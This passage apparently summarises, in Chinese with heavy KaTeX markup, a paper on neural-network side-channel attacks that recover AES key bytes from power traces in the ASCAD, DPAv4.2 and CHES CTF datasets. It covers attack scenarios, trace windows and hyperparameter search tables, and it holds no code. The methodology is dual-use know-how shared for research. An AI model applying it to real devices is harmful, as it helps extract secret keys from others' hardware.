style="height:1.0592em;vertical-align:-0.2769em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>是模型对样本<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>y</mi></msubsup></mrow><annotation encoding="application/x-tex">x_{i}^{y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span></span></span></span>预测的属于标签<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>的概率。Measure等人<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>证明了交叉熵损失函数的最小化类似于最大化的感知信息。PI给出了攻击所需能量迹数量的边界<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mover accent="true"><mi>N</mi><mo>^</mo></mover><mrow><mi>β</mi><mo separator="true">,</mo><mi>P</mi><mi>I</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\hat{N}_{\beta,PI}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2329em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05278em;">β</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>。</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mover accent="true"><mi>N</mi><mo>^</mo></mover><mrow><mi>β</mi><mo separator="true">,</mo><mi>P</mi><mi>I</mi></mrow></msub><mo>≥</mo><mfrac><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>β</mi><mo stretchy="false">)</mo></mrow><mrow><mover accent="true"><mrow><mi>P</mi><mi>I</mi></mrow><mo stretchy="true">^</mo></mover><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\hat{N}_{\beta,PI} \ge \frac{f(\beta)}{\widehat{PI}(X,Y)}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2329em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05278em;">β</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.5503em;vertical-align:-1.1233em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.1267em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9833em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span><span class="svg-align" style="top:-3.6833em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.3em;"><svg xmlns="http://www.w3.org/2000/svg" width='100%' height='0.3em' viewBox='0 0 2364 300' preserveAspectRatio='none'><path d='M1181 0h2l1171 176c6 0 10 5 10 11l-2 23c-1 6-5 10
-11 10h-1L1182 67 15 220h-1c-6 0-10-4-11-10l-2-23c-1-6 4-11 10-11z'/></svg></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1233em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>β</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\beta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mclose">)</span></span></span></span><sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>是一个与期望成功率<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span>相关的较小的常数，这里只在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span>等于0.8时计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span>，也就是成功率等于百分之八十。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>β</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\beta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mclose">)</span></span></span></span>的计算公式如下：</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>β</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>n</mi><mo>−</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>β</mi><mo stretchy="false">)</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mo stretchy="false">(</mo><msup><mn>2</mn><mi>n</mi></msup><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>β</mi><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mo stretchy="false">(</mo><mi>β</mi><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>β</mi><mo stretchy="false">)</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>β</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>n</mi><mo>−</mo><mn>0.2</mn><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mo stretchy="false">(</mo><msup><mn>2</mn><mi>n</mi></msup><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>0.8</mn><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mo stretchy="false">(</mo><mn>0.8</mn><mo stretchy="false">)</mo><mo>+</mo><mn>0.2</mn><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mo stretchy="false">(</mo><mn>0.2</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
f(\beta) &amp;=n-(1-\beta)\log_2(2^n-1)+\beta\log_2(\beta)+(1-\beta)\log_2(1-\beta)\\
&amp;=n-0.2\log_2(2^n-1)+0.8\log_2(0.8)+0.2\log_2(0.2)\\

\end{aligned}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.75em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.25em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.75em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">0.2</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">0.8</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">0.8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">0.2</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">0.2</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.25em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
<h2 id="相关工作">相关工作</h2>
<p>在侧信道攻击中，原始能量迹往往会包含大量特征的原始能量迹。为了降低攻击难度，数据集提供者往往会给出一个修剪后的数据集，选择包含对应密钥字节操作的兴趣点且较小的区间范围，而这个选择的过程是基于掩码已知的知识来完成的。</p>
<p>在文献<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>中，作者通过卷积神经网络来完成在大规模原始能量迹上（包含16w个时间样本点）的攻击，Lu等人<sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup>完成ASCAD、DPAv4.2数据集中基于原始能量迹的攻击。在Lu等人的工作中，作者通过堆叠长短期记忆网络、注意力机制、卷积块来完成模型的构建，模型较为复杂。对此，本文提出了基于简单结构的神经网络模型来恢复密钥字节的方法。</p>
<h2 id="研究方法">研究方法</h2>
<p>作者介绍了三种攻击场景：</p>
<ol>
<li>最坏假设（OPOI）：掩码已知</li>
<li>弱假设（RPOI）：掩码未知</li>
<li>真实场景（NOPOI）：原始能量迹且掩码未知</li>
</ol>
<table>
<thead>
<tr>
<th>数据集</th>
<th>RPOI</th>
<th>OPOI</th>
<th>NOPOI</th>
<th>原始能量迹样本点总数量</th>
</tr>
</thead>
<tbody>
<tr>
<td>ASCADf</td>
<td>包含信噪比峰值的1 000个样本点区间</td>
<td>[45 400:46 100]</td>
<td>[0:100 000]</td>
<td>100 000</td>
</tr>
<tr>
<td>ASCADr</td>
<td>包含信噪比峰值的1 000个样本点区间</td>
<td>[80 945:82 345]</td>
<td>[0:250 000]</td>
<td>250 000</td>
</tr>
<tr>
<td>DPAv4.2</td>
<td>包含信噪比峰值的1 000个样本点区间</td>
<td>[170 000:174 000, 206 000:210 000]</td>
<td>[250 000: 400000]</td>
<td>1 700 000</td>
</tr>
<tr>
<td>CHESCTF</td>
<td>-</td>
<td>[0:10 000, 120 000:150 000]</td>
<td>[0:150 000]</td>
<td>650 000</td>
</tr>
</tbody>
</table>
<h3 id="RPOI">RPOI</h3>
<p>在<code>RPOI</code>场景下，作者的目标是为了验证神经网络模型具有在该数据集上完成攻击的能力，根据掩码选择包含有用信息的信噪比峰值的样本点区间。此外，选择高斯模板攻击、MLP、CNN作对比，并且对比有无LDA降维方案得攻击效果，具体如图1所示。</p>
<img src="../img/image-20241015124444050.png" alt="图1  RPOI场景流程图" style="zoom:30%;" />
<h3 id="OPOI">OPOI</h3>
<p>假设掩码已知，在OPOI的场景下主要考虑包含带掩码的泄露<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>b</mi><mi>o</mi><mi>x</mi></mrow></msub><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo>⊕</mo><msub><mi>k</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>⊕</mo><mi>r</mi></mrow><annotation encoding="application/x-tex">S_{box}(p_i\oplus k_i)\oplus r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>的最高信噪比的样本点区间，但是在攻击时并不加入已知掩码这一背景知识。</p>
<h3 id="NOPOI">NOPOI</h3>
<p>在文献<sup class="footnote-ref"><a href="#fn6" id="fnref6:1">[6:1]</a></sup>中已经考虑过在原始能量迹上无已知掩码的场景，尽管已经有较好的攻击结果，但模型复杂度过高，训练内存要求过大。在原始能量迹上直接发起攻击也许并不适合真实的场景，本文考虑在训练前执行下采样预处理，窗口大小分别为10、20、40以及80，且保证有50%的重叠区间。此外，对DPAv42以及CHESCTF_2018，作者仅考虑在第一轮AES加密对应的时间样本点区间。</p>
<h3 id="模型选择方案">模型选择方案</h3>
<p><strong>MLP</strong></p>
<table>
<thead>
<tr>
<th>超参数</th>
<th>随机搜索</th>
<th>网格搜索</th>
</tr>
</thead>
<tbody>
<tr>
<td>优化器</td>
<td>Adam,RMSprop</td>
<td>Adam,RMSprop</td>
</tr>
<tr>
<td>Dense层</td>
<td>1,2,3,4,5,6,7,8</td>
<td>1,2,3</td>
</tr>
<tr>
<td>神经元个数</td>
<td>10,20,50,100,200,300,400,500</td>
<td>20,50,100,200</td>
</tr>
<tr>
<td>激活函数</td>
<td>SeLU,ReLU</td>
<td>SeLU,ReLU</td>
</tr>
<tr>
<td>学习率</td>
<td>1e-3,1e-4,5e-3,5e-4</td>
<td>1e-3,1e-4</td>
</tr>
<tr>
<td>Batch Size</td>
<td>100 To 1 000 (步长：10)</td>
<td>200,400</td>
</tr>
<tr>
<td>权重初始化方案</td>
<td>ramdom,glorot, he_uniform</td>
<td>Glorot</td>
</tr>
<tr>
<td>正则</td>
<td>Dropout,None,l1,l2</td>
<td>None</td>
</tr>
<tr>
<td>搜索空间</td>
<td>5 971 968</td>
<td>192</td>
</tr>
</tbody>
</table>
<p><strong>CNN</strong></p>
<table>
<thead>
<tr>
<th>超参数</th>
<th>随机搜索</th>
<th>网格搜索</th>
</tr>
</thead>
<tbody>
<tr>
<td>优化器</td>
<td>Adam,RMSprop</td>
<td>Adam,RMSprop</td>
</tr>
<tr>
<td>卷积层</td>
<td>1,2,3,4</td>
<td>1</td>
</tr>
<tr>
<td>滤波器数量</td>
<td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>∗</mo><msup><mn>2</mn><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msup><mo separator="true">,</mo><mn>8</mn><mo>∗</mo><msup><mn>2</mn><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msup><mo separator="true">,</mo><mn>12</mn><mo>∗</mo><msup><mn>2</mn><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msup><mo separator="true">,</mo><mn>16</mn><mo>∗</mo><msup><mn>2</mn><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msup><mo separator="true">,</mo><mi>i</mi><mo>=</mo><mtext>层数索引</mtext></mrow><annotation encoding="application/x-tex">4*2^{i-1}, 8*2^{i-1}, 12*2^{i-1}, 16*2^{i-1},i=层数索引</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0191em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0191em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord 